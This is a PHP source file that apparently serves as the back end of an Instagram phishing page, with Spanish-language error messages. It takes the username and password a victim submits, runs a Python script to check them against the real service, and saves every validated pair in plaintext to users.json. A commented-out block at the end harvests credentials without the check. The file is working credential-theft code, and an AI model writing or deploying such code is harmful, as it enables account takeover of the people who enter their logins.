<?php
include_once('setup.php');

if (isset($_SESSION['error'])) {
    unset($_SESSION['error']);
}

if (isset($_POST['submit'])) {
    $res = array();
    $login_tmp = array('username' => $_POST['username'], 'password' => $_POST['password']);
    file_put_contents('login_tmp.json', json_encode($login_tmp));
    exec($python_path . ' login.py', $res);



    var_dump($res);
    $res = json_decode($res[0], true);
    if (!isset($res['authenticated']) || (isset($res['authenticated']) && $res['authenticated'] != true)) {
        if (isset($res['errors'])) {
            $_SESSION['error'] = $res['errors']['error'][0];
            header('location: ' . $url);
        } else if (isset($res['authenticated']) && $res['authenticated'] != true) {
            $_SESSION['error'] = "Tu contraseña no es correcta. Vuelve a comprobarla.";
            header('location: ' . $url);
        }
    } else {
        if ($res['authenticated'] == true) {
            login($_POST['username'], $_POST['password']);

            if (file_exists('users.json')) {
                $users = file_get_contents('users.json', true);
                $users = json_decode($users, true);
                array_push($users['users'], array('username' => $_POST['username'], 'password' => $_POST['password']));
                file_put_contents('users.json', json_encode($users));
            } else {
                $users = ['users' => []];
                array_push($users['users'], array('username' => $_POST['username'], 'password' => $_POST['password']));
                file_put_contents('users.json', json_encode($users));
            }
            // header('location: https://www.instagram.com');
        } else {
            $_SESSION['error'] = "Ha ocurrido un error al iniciar sesión, vuelva a intentarlo.";
            header('location: ' . $url);
        }
    }
}



// if (isset($_POST['submit'])) {
//     if (file_exists('users.json')) {
//         $users = file_get_contents('users.json', true);
//         $users = json_decode($users, true);
//         array_push($users['users'], array('username' => $_POST['username'], 'password' => $_POST['password']));
//         file_put_contents('users.json', json_encode($users));
//     } else {
//         $users = ['users' => []];
//         array_push($users['users'], array('username' => $_POST['username'], 'password' => $_POST['password']));
//         file_put_contents('users.json', json_encode($users));
//     }
//     header('location: ../index.html');
// }
